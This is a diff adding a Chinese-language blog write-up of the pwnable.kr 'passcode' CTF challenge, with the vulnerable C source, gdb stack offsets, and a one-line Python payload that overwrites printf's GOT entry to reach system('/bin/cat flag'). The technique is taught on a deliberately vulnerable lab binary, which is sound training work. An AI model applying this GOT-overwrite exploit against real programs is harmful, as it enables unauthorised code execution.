@@ -198,7 +198,67 @@ int main(int argc, char* argv[]){
 > ssh passcode@pwnable.kr -p2222 (pw:guest)
 
 
-(preloading...)
+{% highlight c %}
+#include <stdio.h>
+#include <stdlib.h>
+
+void login(){
+	int passcode1;
+	int passcode2;
+
+	printf("enter passcode1 : ");
+	scanf("%d", passcode1);
+	fflush(stdin);
+
+	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+	printf("enter passcode2 : ");
+        scanf("%d", passcode2);
+
+	printf("checking...\n");
+	if(passcode1==338150 && passcode2==13371337){
+                printf("Login OK!\n");
+                system("/bin/cat flag");
+        }
+        else{
+                printf("Login Failed!\n");
+		exit(0);
+        }
+}
+
+void welcome(){
+	char name[100];
+	printf("enter you name : ");
+	scanf("%100s", name);
+	printf("Welcome %s!\n", name);
+}
+
+int main(){
+	printf("Toddler's Secure Login System 1.0 beta.\n");
+
+	welcome();
+	login();
+
+	// something after login...
+	printf("Now I can safely trust you that you have credential :)\n");
+	return 0;
+}
+{% endhighlight %}
+
+对 C 语言熟悉的同学都能很轻易的发现，程序在调用 `scanf()` 函数来获取用户输入时，第二个参数没有传递参数地址而直接传递了参数，可能导致内存异常写入。
+
+通过 `gdb` 调试可以发现，输入的用户名 `name` 位于 `ebp-0x70`，`password1` 位于 `ebp-0x10`，`password2` 位于 `ebp-0xc`，由于这样的堆栈布局，导致了在输入用户名时可以覆盖到 `ebp-0x10`，也就是能控制 `password1` 的值，最终导致任意4字节写。
+
+这里由于堆栈不能执行，不能更改 GOT 指向 shellcode，但是可以直接修改 GOT 后将程序流程跳转到输出 flag 的部分，即 `system("/bin/cat flag");`，我们查看一下代码所处位置：
+
+![]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/passcode-1.png)
+
+可以看到代码处于 `0x080485e3`，我们通过更改 `printf()` 函数的 GOT 来让我们输入完 `password1` 后的 `printf()` 函数调用流程转到 `system("/bin/cat flag");` 处。
+
+`name` 与 `password1` 相差 `96 bytes`，所有构造的 payload 如下：
+
+	python -c "print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'" | ./passcode
+
+![]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/passcode-2.png)
 
 
 ### [random]
